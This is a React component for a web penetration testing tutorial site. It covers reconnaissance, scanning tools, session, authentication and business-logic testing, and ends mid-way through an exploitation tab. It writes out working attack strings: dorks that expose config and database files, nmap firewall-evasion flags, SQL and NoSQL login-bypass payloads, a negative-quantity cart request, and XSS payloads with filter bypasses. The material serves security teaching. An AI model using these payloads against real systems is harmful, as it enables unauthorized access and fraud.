
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { 
  Search, 
  Shield, 
  Target, 
  Code, 
  Database, 
  Lock, 
  Bug, 
  FileSearch,
  Terminal,
  AlertTriangle,
  Eye,
  Globe,
  Network,
  Server,
  Zap
} from 'lucide-react';

const TestingTechniquesSection: React.FC = () => {
  return (
    <div className="space-y-8">
      <div className="text-center mb-8">
        <h2 className="text-3xl font-bold mb-4 text-cybr-primary">Web Penetration Testing Techniques</h2>
        <p className="text-lg opacity-80">
          Comprehensive methodologies, tools, and techniques for professional web application security testing
        </p>
      </div>

      <Tabs defaultValue="reconnaissance" className="w-full">
        <TabsList className="grid w-full grid-cols-2 md:grid-cols-3 lg:grid-cols-6">
          <TabsTrigger value="reconnaissance" className="flex items-center gap-2">
            <Search className="h-4 w-4" />
            <span className="hidden sm:inline">Reconnaissance</span>
          </TabsTrigger>
          <TabsTrigger value="vulnerability-scanning" className="flex items-center gap-2">
            <Shield className="h-4 w-4" />
            <span className="hidden sm:inline">Vulnerability Scanning</span>
          </TabsTrigger>
          <TabsTrigger value="manual-testing" className="flex items-center gap-2">
            <Target className="h-4 w-4" />
            <span className="hidden sm:inline">Manual Testing</span>
          </TabsTrigger>
          <TabsTrigger value="exploitation" className="flex items-center gap-2">
            <Bug className="h-4 w-4" />
            <span className="hidden sm:inline">Exploitation</span>
          </TabsTrigger>
          <TabsTrigger value="methodology" className="flex items-center gap-2">
            <FileSearch className="h-4 w-4" />
            <span className="hidden sm:inline">Methodology</span>
          </TabsTrigger>
          <TabsTrigger value="advanced" className="flex items-center gap-2">
            <Zap className="h-4 w-4" />
            <span className="hidden sm:inline">Advanced</span>
          </TabsTrigger>
        </TabsList>

        {/* Reconnaissance Tab */}
        <TabsContent value="reconnaissance" className="mt-6">
          <div className="grid gap-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Eye className="h-5 w-5" />
                  OSINT (Open Source Intelligence) Gathering
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Popular OSINT Tools</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <Badge variant="outline" className="mb-2">Search Engines</Badge>
                        <ul className="space-y-1 text-sm">
                          <li><strong>Google Dorking:</strong> Advanced search operators</li>
                          <li><strong>Shodan:</strong> Internet-connected device search</li>
                          <li><strong>Censys:</strong> Internet scanning and reconnaissance</li>
                          <li><strong>ZoomEye:</strong> Cyberspace search engine</li>
                        </ul>
                      </div>
                      <div className="space-y-2">
                        <Badge variant="outline" className="mb-2">Information Gathering</Badge>
                        <ul className="space-y-1 text-sm">
                          <li><strong>theHarvester:</strong> Email and subdomain gathering</li>
                          <li><strong>Maltego:</strong> Link analysis and data mining</li>
                          <li><strong>Recon-ng:</strong> Reconnaissance framework</li>
                          <li><strong>SpiderFoot:</strong> Automated reconnaissance</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Google Dorking Examples</h4>
                    <div className="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm space-y-2">
                      <div># Administrative Interfaces</div>
                      <div>site:example.com inurl:admin</div>
                      <div>site:example.com inurl:login</div>
                      <div>site:example.com intitle:"admin panel"</div>
                      <div></div>
                      <div># Configuration Files</div>
                      <div>site:example.com filetype:xml | filetype:conf</div>
                      <div>site:example.com ext:cfg | ext:env</div>
                      <div></div>
                      <div># Database Files</div>
                      <div>site:example.com filetype:sql | filetype:dbf</div>
                      <div>site:example.com ext:db | ext:sqlite</div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Social Media Intelligence</h4>
                    <ul className="space-y-2 text-sm">
                      <li><strong>Employee Profiling:</strong> LinkedIn reconnaissance, Twitter analysis</li>
                      <li><strong>Corporate Information:</strong> Company structure mapping, key personnel</li>
                      <li><strong>Technology Stack Discovery:</strong> Job postings analysis, tech mentions</li>
                      <li><strong>Email Pattern Discovery:</strong> firstname.lastname@company.com patterns</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Globe className="h-5 w-5" />
                  Subdomain Enumeration
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Active Enumeration Tools</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <ul className="space-y-2 text-sm">
                          <li><strong>Amass:</strong> Advanced DNS enumeration</li>
                          <li><strong>Subfinder:</strong> High-speed discovery</li>
                          <li><strong>Assetfinder:</strong> Rapid asset discovery</li>
                          <li><strong>Sublist3r:</strong> Multi-source enumeration</li>
                          <li><strong>Knock:</strong> Wordlist-based discovery</li>
                        </ul>
                      </div>
                      <div>
                        <ul className="space-y-2 text-sm">
                          <li><strong>Subbrute:</strong> Brute force approach</li>
                          <li><strong>DNSRecon:</strong> Comprehensive DNS enumeration</li>
                          <li><strong>Fierce:</strong> Domain scanner</li>
                          <li><strong>Subdomainizer:</strong> Passive discovery</li>
                          <li><strong>Findomain:</strong> Cross-platform enumeration</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Command Examples</h4>
                    <div className="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm space-y-2">
                      <div># Amass enumeration</div>
                      <div>amass enum -d example.com</div>
                      <div>amass enum -brute -d example.com</div>
                      <div></div>
                      <div># Subfinder passive enumeration</div>
                      <div>subfinder -d example.com</div>
                      <div>subfinder -d example.com -all</div>
                      <div></div>
                      <div># Sublist3r multi-source</div>
                      <div>sublist3r -d example.com</div>
                      <div>sublist3r -d example.com -b</div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Passive Enumeration Techniques</h4>
                    <ul className="space-y-2 text-sm">
                      <li><strong>Certificate Transparency:</strong> crt.sh, censys.io analysis</li>
                      <li><strong>DNS Aggregators:</strong> SecurityTrails, PassiveTotal</li>
                      <li><strong>Search Engine Discovery:</strong> Google, Bing dorking</li>
                      <li><strong>Archive Analysis:</strong> Wayback Machine historical data</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Server className="h-5 w-5" />
                  Technology Stack Identification
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Web Technology Detection Tools</h4>
                    <div className="grid md:grid-cols-3 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Browser Extensions</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Wappalyzer</li>
                          <li>BuiltWith</li>
                          <li>WhatRuns</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Command Line</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>WhatWeb</li>
                          <li>Nikto</li>
                          <li>Nmap scripts</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Online Tools</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Netcraft</li>
                          <li>SecurityHeaders</li>
                          <li>SSL Labs</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Advanced Fingerprinting</h4>
                    <ul className="space-y-2 text-sm">
                      <li><strong>HTTP Header Analysis:</strong> Server signatures, custom headers</li>
                      <li><strong>Response Body Fingerprinting:</strong> Error messages, default pages</li>
                      <li><strong>Cookie Analysis:</strong> Session management, framework identification</li>
                      <li><strong>JavaScript Framework Detection:</strong> Angular, React, Vue.js</li>
                      <li><strong>SSL/TLS Certificate Analysis:</strong> Issuer patterns, transparency logs</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Network className="h-5 w-5" />
                  Port Scanning & Content Discovery
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Nmap Advanced Usage</h4>
                    <div className="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm space-y-2">
                      <div># Basic scans</div>
                      <div>nmap -sS -p- target.com</div>
                      <div>nmap -sV -p- target.com</div>
                      <div>nmap -O target.com</div>
                      <div></div>
                      <div># Script scanning</div>
                      <div>nmap --script=default target.com</div>
                      <div>nmap --script=vuln target.com</div>
                      <div>nmap --script http-enum target.com</div>
                      <div></div>
                      <div># Firewall evasion</div>
                      <div>nmap -f target.com</div>
                      <div>nmap -D decoy1,decoy2,ME target.com</div>
                      <div>nmap --source-port 53 target.com</div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Content Discovery Tools</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <ul className="space-y-2 text-sm">
                          <li><strong>Gobuster:</strong> High-performance brute forcing</li>
                          <li><strong>Dirbuster:</strong> GUI-based discovery</li>
                          <li><strong>Dirb:</strong> Recursive scanning</li>
                          <li><strong>FFuF:</strong> Fast web fuzzer</li>
                          <li><strong>Feroxbuster:</strong> Recursive enumeration</li>
                        </ul>
                      </div>
                      <div>
                        <ul className="space-y-2 text-sm">
                          <li><strong>WFuzz:</strong> Web application fuzzer</li>
                          <li><strong>DirSearch:</strong> Advanced directory search</li>
                          <li><strong>Dirsearch:</strong> Python-based scanner</li>
                          <li><strong>Katana:</strong> Next-generation crawler</li>
                          <li><strong>Hakrawler:</strong> Simple web crawler</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Directory Bruteforce Examples</h4>
                    <div className="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm space-y-2">
                      <div># Gobuster directory enumeration</div>
                      <div>gobuster dir -u http://target.com -w /path/to/wordlist</div>
                      <div>gobuster dir -u http://target.com -w common.txt -x php,html,js</div>
                      <div></div>
                      <div># FFuF fuzzing</div>
                      <div>ffuf -w wordlist.txt -u http://target.com/FUZZ</div>
                      <div>ffuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.html</div>
                      <div></div>
                      <div># Feroxbuster recursive</div>
                      <div>feroxbuster -u http://target.com</div>
                      <div>feroxbuster -u http://target.com -x php html js</div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Vulnerability Scanning Tab */}
        <TabsContent value="vulnerability-scanning" className="mt-6">
          <div className="grid gap-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Shield className="h-5 w-5" />
                  Automated Scanning Tools
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Burp Suite Professional</h4>
                    <div className="space-y-3">
                      <p className="text-sm">Industry-standard web application security testing platform</p>
                      <div className="grid md:grid-cols-2 gap-4">
                        <div>
                          <Badge variant="outline" className="mb-2">Key Features</Badge>
                          <ul className="space-y-1 text-sm">
                            <li>Advanced web vulnerability scanner</li>
                            <li>Manual testing tools (Proxy, Repeater, Intruder)</li>
                            <li>Extensible platform with BApp Store</li>
                            <li>Collaboration features for team testing</li>
                          </ul>
                        </div>
                        <div>
                          <Badge variant="outline" className="mb-2">Usage Tips</Badge>
                          <ul className="space-y-1 text-sm">
                            <li>Configure browser proxy settings</li>
                            <li>Define target scope accurately</li>
                            <li>Use authenticated scanning for better coverage</li>
                            <li>Customize scan configurations for specific apps</li>
                          </ul>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">OWASP ZAP</h4>
                    <div className="space-y-3">
                      <p className="text-sm">Free, open-source web application security scanner</p>
                      <div className="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm space-y-2">
                        <div># ZAP command line usage</div>
                        <div>zap-cli quick-scan --self-contained http://target.com</div>
                        <div>zap-cli active-scan http://target.com</div>
                        <div>zap-cli spider http://target.com</div>
                        <div></div>
                        <div># Generate reports</div>
                        <div>zap-cli report -o zap-report.html -f html</div>
                        <div>zap-cli report -o zap-report.xml -f xml</div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Additional Tools Comparison</h4>
                    <div className="overflow-x-auto">
                      <table className="w-full text-sm border-collapse">
                        <thead>
                          <tr className="border-b">
                            <th className="text-left p-2">Tool</th>
                            <th className="text-left p-2">Type</th>
                            <th className="text-left p-2">Strengths</th>
                            <th className="text-left p-2">Best For</th>
                          </tr>
                        </thead>
                        <tbody className="text-xs">
                          <tr className="border-b">
                            <td className="p-2 font-semibold">Nikto</td>
                            <td className="p-2">Free</td>
                            <td className="p-2">Fast, comprehensive checks</td>
                            <td className="p-2">Quick vulnerability assessment</td>
                          </tr>
                          <tr className="border-b">
                            <td className="p-2 font-semibold">Nuclei</td>
                            <td className="p-2">Free</td>
                            <td className="p-2">YAML-based templates</td>
                            <td className="p-2">Custom vulnerability detection</td>
                          </tr>
                          <tr className="border-b">
                            <td className="p-2 font-semibold">Acunetix</td>
                            <td className="p-2">Commercial</td>
                            <td className="p-2">High accuracy, modern apps</td>
                            <td className="p-2">Enterprise environments</td>
                          </tr>
                          <tr className="border-b">
                            <td className="p-2 font-semibold">Nessus</td>
                            <td className="p-2">Commercial</td>
                            <td className="p-2">Comprehensive vuln database</td>
                            <td className="p-2">Infrastructure + web scanning</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Bug className="h-5 w-5" />
                  Advanced Fuzzing Techniques
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Parameter Fuzzing</h4>
                    <div className="space-y-3">
                      <div className="grid md:grid-cols-2 gap-4">
                        <div>
                          <Badge variant="outline" className="mb-2">Input Types</Badge>
                          <ul className="space-y-1 text-sm">
                            <li>GET parameters</li>
                            <li>POST data</li>
                            <li>HTTP headers</li>
                            <li>Cookies</li>
                            <li>JSON/XML payloads</li>
                          </ul>
                        </div>
                        <div>
                          <Badge variant="outline" className="mb-2">Fuzzing Goals</Badge>
                          <ul className="space-y-1 text-sm">
                            <li>Input validation bypass</li>
                            <li>Business logic flaws</li>
                            <li>Authentication bypass</li>
                            <li>Authorization issues</li>
                            <li>Error disclosure</li>
                          </ul>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Fuzzing Tools & Commands</h4>
                    <div className="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm space-y-2">
                      <div># FFuF parameter fuzzing</div>
                      <div>ffuf -w params.txt -u http://target.com/?FUZZ=test</div>
                      <div>ffuf -w payloads.txt -u http://target.com/api -X POST -d FUZZ</div>
                      <div></div>
                      <div># Burp Intruder patterns</div>
                      <div># Sniper: Single payload position</div>
                      <div># Battering ram: Same payload in all positions</div>
                      <div># Pitchfork: Different payload sets, parallel</div>
                      <div># Cluster bomb: All combinations</div>
                      <div></div>
                      <div># Wfuzz examples</div>
                      <div>wfuzz -w wordlist.txt http://target.com/FUZZ</div>
                      <div>wfuzz -w users.txt -w passes.txt http://target.com/login?user=FUZZ&pass=FUZ2Z</div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Advanced Payload Generation</h4>
                    <ul className="space-y-2 text-sm">
                      <li><strong>SecLists:</strong> Comprehensive wordlist collection</li>
                      <li><strong>FuzzDB:</strong> Attack pattern database</li>
                      <li><strong>Custom Wordlists:</strong> CeWL for site-specific words</li>
                      <li><strong>Mutation-based:</strong> Radamsa for input mutation</li>
                      <li><strong>Grammar-based:</strong> Context-free grammar generation</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Code className="h-5 w-5" />
                  Static & Dynamic Analysis
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Static Analysis Tools</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Open Source</Badge>
                        <ul className="space-y-1 text-sm">
                          <li><strong>SonarQube:</strong> Code quality & security</li>
                          <li><strong>Semgrep:</strong> Static analysis rules</li>
                          <li><strong>Bandit:</strong> Python security linter</li>
                          <li><strong>ESLint:</strong> JavaScript security rules</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Commercial</Badge>
                        <ul className="space-y-1 text-sm">
                          <li><strong>Checkmarx:</strong> SAST platform</li>
                          <li><strong>Veracode:</strong> Static + dynamic analysis</li>
                          <li><strong>Fortify:</strong> HP security testing</li>
                          <li><strong>CodeQL:</strong> GitHub semantic analysis</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Dynamic Analysis Approach</h4>
                    <div className="space-y-3">
                      <ul className="space-y-2 text-sm">
                        <li><strong>Runtime Monitoring:</strong> Application behavior analysis during execution</li>
                        <li><strong>Interactive Testing:</strong> IAST (Interactive Application Security Testing)</li>
                        <li><strong>Performance Impact:</strong> Security testing with minimal performance overhead</li>
                        <li><strong>Real-time Feedback:</strong> Immediate vulnerability detection</li>
                      </ul>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">SAST vs DAST Comparison</h4>
                    <div className="overflow-x-auto">
                      <table className="w-full text-sm border-collapse">
                        <thead>
                          <tr className="border-b">
                            <th className="text-left p-2">Aspect</th>
                            <th className="text-left p-2">SAST</th>
                            <th className="text-left p-2">DAST</th>
                          </tr>
                        </thead>
                        <tbody className="text-xs">
                          <tr className="border-b">
                            <td className="p-2 font-semibold">Testing Phase</td>
                            <td className="p-2">Development</td>
                            <td className="p-2">Testing/Production</td>
                          </tr>
                          <tr className="border-b">
                            <td className="p-2 font-semibold">Code Access</td>
                            <td className="p-2">Source code required</td>
                            <td className="p-2">Black box testing</td>
                          </tr>
                          <tr className="border-b">
                            <td className="p-2 font-semibold">Coverage</td>
                            <td className="p-2">100% code coverage</td>
                            <td className="p-2">Runtime path coverage</td>
                          </tr>
                          <tr className="border-b">
                            <td className="p-2 font-semibold">False Positives</td>
                            <td className="p-2">Higher rate</td>
                            <td className="p-2">Lower rate</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Manual Testing Tab */}
        <TabsContent value="manual-testing" className="mt-6">
          <div className="grid gap-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Lock className="h-5 w-5" />
                  Session Management Testing
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Session Token Analysis</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Token Properties</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Randomness and entropy</li>
                          <li>Length and complexity</li>
                          <li>Predictability patterns</li>
                          <li>Encoding mechanisms</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Security Attributes</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>HttpOnly flag</li>
                          <li>Secure flag</li>
                          <li>SameSite attribute</li>
                          <li>Expiration settings</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Common Session Vulnerabilities</h4>
                    <Accordion type="single" collapsible className="w-full">
                      <AccordionItem value="session-fixation">
                        <AccordionTrigger>Session Fixation</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <p className="text-sm">Attack where an attacker fixes a user's session ID before authentication.</p>
                            <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs">
                              <div># Testing for session fixation</div>
                              <div>1. Obtain session ID before login</div>
                              <div>2. Login with valid credentials</div>
                              <div>3. Check if session ID changed after login</div>
                              <div>4. If unchanged, vulnerability exists</div>
                            </div>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                      <AccordionItem value="session-hijacking">
                        <AccordionTrigger>Session Hijacking</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <p className="text-sm">Unauthorized access to user sessions through token theft.</p>
                            <ul className="text-sm space-y-1">
                              <li>• XSS-based token theft</li>
                              <li>• Network sniffing (unencrypted)</li>
                              <li>• Man-in-the-middle attacks</li>
                              <li>• Browser vulnerabilities</li>
                            </ul>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                      <AccordionItem value="concurrent-sessions">
                        <AccordionTrigger>Concurrent Session Issues</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <p className="text-sm">Problems with multiple simultaneous user sessions.</p>
                            <ul className="text-sm space-y-1">
                              <li>• Unlimited concurrent sessions</li>
                              <li>• Session confusion attacks</li>
                              <li>• Resource exhaustion</li>
                              <li>• Privilege escalation via session sharing</li>
                            </ul>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                    </Accordion>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Session Testing Checklist</h4>
                    <div className="space-y-2">
                      <div className="flex items-center space-x-2">
                        <input type="checkbox" className="rounded" />
                        <label className="text-sm">Session ID randomness analysis</label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <input type="checkbox" className="rounded" />
                        <label className="text-sm">Session timeout verification</label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <input type="checkbox" className="rounded" />
                        <label className="text-sm">Logout functionality testing</label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <input type="checkbox" className="rounded" />
                        <label className="text-sm">Session regeneration after login</label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <input type="checkbox" className="rounded" />
                        <label className="text-sm">Cross-domain session handling</label>
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Target className="h-5 w-5" />
                  Authentication & Authorization Testing
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Authentication Bypass Techniques</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">SQL Injection Bypass</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>admin' OR '1'='1' --</div>
                          <div>admin' OR 1=1 #</div>
                          <div>" OR ""="" </div>
                          <div>admin') OR ('1'='1' --</div>
                        </div>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">NoSQL Injection</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>admin' || 'a'=='a</div>
                          <div>{"username[$ne]": null}</div>
                          <div>{"username[$regex]": ".*"}</div>
                          <div>{"username[$exists]": true}</div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Authorization Testing Framework</h4>
                    <div className="space-y-4">
                      <div>
                        <h5 className="font-medium mb-2">Vertical Privilege Escalation</h5>
                        <p className="text-sm mb-2">Testing for unauthorized access to higher privilege functions</p>
                        <ul className="text-sm space-y-1">
                          <li>• User to admin privilege escalation</li>
                          <li>• Role boundary violations</li>
                          <li>• Administrative function access</li>
                          <li>• System-level operation access</li>
                        </ul>
                      </div>
                      <div>
                        <h5 className="font-medium mb-2">Horizontal Privilege Escalation</h5>
                        <p className="text-sm mb-2">Testing for unauthorized access to same-level resources</p>
                        <ul className="text-sm space-y-1">
                          <li>• User A accessing User B's data</li>
                          <li>• IDOR (Insecure Direct Object Reference)</li>
                          <li>• Resource enumeration attacks</li>
                          <li>• Multi-tenant boundary violations</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Multi-Factor Authentication Testing</h4>
                    <div className="space-y-3">
                      <ul className="space-y-2 text-sm">
                        <li><strong>TOTP Bypass:</strong> Time-based one-time password vulnerabilities</li>
                        <li><strong>SMS Interception:</strong> SIM swapping and SS7 attacks</li>
                        <li><strong>Backup Code Abuse:</strong> Recovery mechanism exploitation</li>
                        <li><strong>Push Notification Bypass:</strong> Mobile app MFA circumvention</li>
                        <li><strong>Biometric Spoofing:</strong> Fingerprint and facial recognition bypass</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Database className="h-5 w-5" />
                  Business Logic Testing
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">Workflow Manipulation</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Step Manipulation</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Step skipping attacks</li>
                          <li>Process reversal</li>
                          <li>Parallel processing</li>
                          <li>Time manipulation</li>
                        </ul>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Data Manipulation</Badge>
                        <ul className="space-y-1 text-sm">
                          <li>Quantity manipulation</li>
                          <li>Price manipulation</li>
                          <li>Currency conversion abuse</li>
                          <li>Discount stacking</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">E-commerce Specific Tests</h4>
                    <Accordion type="single" collapsible className="w-full">
                      <AccordionItem value="shopping-cart">
                        <AccordionTrigger>Shopping Cart Manipulation</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <ul className="text-sm space-y-1">
                              <li>• Negative quantity orders</li>
                              <li>• Price modification attacks</li>
                              <li>• Currency manipulation</li>
                              <li>• Shipping cost bypass</li>
                              <li>• Tax calculation errors</li>
                            </ul>
                            <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs">
                              <div># Example: Negative quantity attack</div>
                              <div>POST /cart/add</div>
                              <div>product_id=123&quantity=-5&price=100</div>
                              <div># Results in negative total, potential refund</div>
                            </div>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                      <AccordionItem value="payment-bypass">
                        <AccordionTrigger>Payment Process Bypass</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <ul className="text-sm space-y-1">
                              <li>• Payment gateway bypass</li>
                              <li>• Transaction manipulation</li>
                              <li>• Refund process abuse</li>
                              <li>• Currency conversion exploitation</li>
                            </ul>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                      <AccordionItem value="loyalty-programs">
                        <AccordionTrigger>Loyalty Program Exploitation</AccordionTrigger>
                        <AccordionContent>
                          <div className="space-y-3">
                            <ul className="text-sm space-y-1">
                              <li>• Point manipulation attacks</li>
                              <li>• Reward system abuse</li>
                              <li>• Referral system exploitation</li>
                              <li>• Multiple account coordination</li>
                            </ul>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                    </Accordion>
                  </div>

                  <div>
                    <h4 className="text-lg font-semibold mb-3">Race Condition Testing</h4>
                    <div className="space-y-3">
                      <p className="text-sm">
                        Race conditions occur when the application's behavior depends on the timing of uncontrollable events.
                      </p>
                      <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                        <div># Burp Suite Turbo Intruder example</div>
                        <div>def queueRequests(target, wordlists):</div>
                        <div>    for i in range(10):</div>
                        <div>        engine.queue(target.req, gate='race1')</div>
                        <div>    engine.openGate('race1')</div>
                      </div>
                      <ul className="text-sm space-y-1">
                        <li>• Concurrent transaction processing</li>
                        <li>• Resource reservation conflicts</li>
                        <li>• Account balance manipulation</li>
                        <li>• File upload race conditions</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Exploitation Tab */}
        <TabsContent value="exploitation" className="mt-6">
          <div className="grid gap-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Bug className="h-5 w-5" />
                  Payload Crafting & Exploitation
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-6">
                  <div>
                    <h4 className="text-lg font-semibold mb-3">XSS Payload Development</h4>
                    <div className="space-y-4">
                      <div>
                        <Badge variant="outline" className="mb-2">Basic XSS Payloads</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
                          <div>&lt;img src=x onerror=alert('XSS')&gt;</div>
                          <div>&lt;svg onload=alert('XSS')&gt;</div>
                          <div>&lt;body onload=alert('XSS')&gt;</div>
                          <div>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</div>
                        </div>
                      </div>
                      <div>
                        <Badge variant="outline" className="mb-2">Filter Bypass Techniques</Badge>
                        <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-xs space-y-1">
                          <div>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</div>
                          <div>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</div>
                          <div>&lt;script&gt;alert(/XSS/.source)&lt;/script&gt;</div>
